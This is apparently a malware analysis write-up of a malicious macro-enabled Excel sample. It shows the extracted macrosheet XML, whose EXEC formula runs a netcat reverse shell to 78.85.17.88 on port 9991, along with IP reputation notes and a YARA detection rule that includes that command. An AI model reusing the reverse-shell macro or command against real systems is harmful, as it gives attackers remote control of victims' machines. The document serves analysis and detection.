**SHA256**: 6fff03a5b2e69d3e0fc91be6d24a3dbbd37e490214122fa2a1ea6e80acfa2131  
**FileType**: XLSM (Microsoft Excel)  
**Sample**: https://bazaar.abuse.ch/sample/6fff03a5b2e69d3e0fc91be6d24a3dbbd37e490214122fa2a1ea6e80acfa2131/  

## Analysis  
- Extracted the file from the `6fff03a5b2e69d3e0fc91be6d24a3dbbd37e490214122fa2a1ea6e80acfa2131.zip`  
- Renamed `6fff03a5b2e69d3e0fc91be6d24a3dbbd37e490214122fa2a1ea6e80acfa2131.xlsm` to `sample.xlsm`  
- Unzipped the `sample.xlsm`  
    - Command: `unzip sample.xlsm`  
    - Extracted the raw xml files that make the XLSM file  
- Moved all files to `sample_unzipped`  
![extracted_files](https://user-images.githubusercontent.com/17150767/184518277-fba4710b-6c1b-4a11-8154-6bc81f4ec429.png)  

- Viewing the `[Content_Types].xml` show there are macros in the file and in which sheet
```XML
<Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml" />
<Override PartName="/xl/macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macrosheet+xml" />
```
![content_types_xml](https://user-images.githubusercontent.com/17150767/184518255-c17957ae-3e38-4c9a-ab22-9c204790b054.png)

- Viewing the `/xl/workbook.xml` shows there is `AlternateContent` being referenced.
  - URL: hxxps://d[dot]docs[dot]live[dot]net/fbbe0fec9fe4db2b/Рабочий стол/
  - The link points to a onedrive object - (Not analyized - Required Login)
```XML
<mc:AlternateContent xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006">
    <mc:Choice Requires="x15">
        <x15ac:absPath url="hxxps://d[dot]docs[dot]live[dot]net/fbbe0fec9fe4db2b/Рабочий стол/" xmlns:x15ac="http://schemas.microsoft.com/office/spreadsheetml/2010/11/ac" />
    </mc:Choice>
</mc:AlternateContent>
```

- Viewing the `/xl/marcosheets/sheet1.xml` shows that there is `EXEC` & `HALT` function call.
  - `EXEC` function attempts to make a reverse shell connection via Netcat to an IP(`78.85.17.88`) on port `9991`
```XML
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<xm:macrosheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" xmlns:xm="http://schemas.microsoft.com/office/excel/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006" mc:Ignorable="x14ac xr xr2 xr3 xr6" xmlns:x14ac="http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac" xmlns:xr="http://schemas.microsoft.com/office/spreadsheetml/2014/revision" xmlns:xr2="http://schemas.microsoft.com/office/spreadsheetml/2015/revision2" xmlns:xr3="http://schemas.microsoft.com/office/spreadsheetml/2016/revision3" xmlns:xr6="http://schemas.microsoft.com/office/spreadsheetml/2016/revision6" xr6:uid="{FAFA17A0-63C0-4C8D-B312-2B5FD1769157}">
    <dimension ref="A1:A2" />
    <sheetViews>
        <sheetView showFormulas="1" tabSelected="1" workbookViewId="0" />
    </sheetViews>
    <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25" />
    <cols>
        <col min="1" max="1" width="35.5703125" bestFit="1" customWidth="1" />
    </cols>
    <sheetData>
        <row r="1" spans="1:1" x14ac:dyDescent="0.25">
            <c r="A1">
                <f>EXEC("nc.exe -e cmd.exe 78.85.17.88 9991")</f>
                <v>33</v>
            </c>
        </row>
        <row r="2" spans="1:1" x14ac:dyDescent="0.25">
            <c r="A2" t="b">
                <f>HALT()</f>
                <v>1</v>
            </c>
        </row>
    </sheetData>
    <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3" />
</xm:macrosheet>
```

### IP(78.85.17.88) Analysis
VirusTotal(VT) Scan: https://www.virustotal.com/gui/ip-address/78.85.17.88
IP belongs to `Russia` and has been used by malware strands such as `Cobalt Strike` & `Emotet`. See https://www.virustotal.com/gui/ip-address/78.85.17.88/community.

![vt_scan_for_ip](https://user-images.githubusercontent.com/17150767/184518245-43ced672-25ec-4864-89be-b84ee5c64d41.png)

```YAML
rule russian_cobalt_strike_reverse_shell_in_xlsm_files {
  meta: 
    Description = "Detects EXEC() calls in Office files (XLSM) involving reverse connections to 78.85.17.88"
    Author = "Twitch/notdankenoughq - Github/M-Faheem-Khan"
    date = "August 13, 2022"
  strings: 
    $xlsm_file_header = { 50 4b }
    $content_type_xml = { 5b 43 6f 6e 74 65 6e 74 5f 54  79 70 65 73 5d 2e 78 6d 6c }
    $exec_function = "EXEC("
    $exec_function_call = "EXEC(\"nc.exe -e cmd.exe 78.85.17.88 9991\""
    $malicious_ip = "78.85.17.88"
    
  condition:
    all of them
}
```

<!-- EOF -->
